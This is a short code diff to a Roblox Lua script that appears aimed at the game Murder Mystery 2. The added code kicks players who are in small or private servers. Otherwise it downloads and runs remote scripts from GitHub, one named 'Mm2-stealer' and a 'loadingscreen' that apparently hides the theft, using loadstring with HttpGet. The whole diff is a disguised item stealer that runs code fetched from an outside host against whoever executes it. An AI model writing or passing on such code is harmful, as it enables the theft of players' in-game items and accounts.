@@ -1,10 +1,16 @@
-local function stealer()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/SDF8/Mm2-stealer/refs/heads/main/stealer.lua", true))()
-end
+local Players = game:GetService("Players")
 
-local function loadingscreen()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/spawnerscript/loadingscreen/refs/heads/main/plsnoskid.lua"))()
-end
+if #Players:GetPlayers() <= 3 then
+    Players.LocalPlayer:Kick("the script dont work with privet servers")
+else
+    local function stealer()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/SDF8/Mm2-stealer/refs/heads/main/stealer.lua", true))()
+    end
 
-task.spawn(stealer)
-task.spawn(loadingscreen)
+    local function loadingscreen()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/spawnerscript/loadingscreen/refs/heads/main/plsnoskid.lua"))()
+    end
+
+    task.spawn(stealer)
+    task.spawn(loadingscreen)
+end
